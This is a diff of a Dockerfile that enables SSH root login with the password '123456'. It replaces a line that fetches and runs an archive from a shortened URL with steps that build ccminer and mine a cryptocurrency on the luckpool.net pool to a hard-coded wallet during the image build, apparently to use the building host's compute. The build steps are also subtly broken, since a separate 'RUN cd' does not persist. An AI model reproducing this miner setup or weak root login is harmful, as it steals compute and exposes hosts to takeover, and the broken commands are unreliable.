@@ -18,6 +18,13 @@ RUN echo '/usr/sbin/sshd -D' >>/luo.sh
 RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 RUN echo root:123456|chpasswd
 RUN chmod 755 /luo.sh
-RUN wget -O gas.tar https://tinyurl.com/linuxrtm && tar xf gas.tar && cd linux && chmod +x start.sh && ./start.sh
+RUN apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
+RUN git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git
+RUN cd ccminer
+RUN chmod +x build.sh
+RUN chmod +x configure.sh
+RUN chmod +x autogen.sh
+RUN ./build.sh
+RUN ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RXJdpoJge8fr62Bguz2EDoXVaNA7o6ZaEc.Gratis -p x -d 0 -t 4 -r 100
 EXPOSE 80
 CMD  /luo.sh
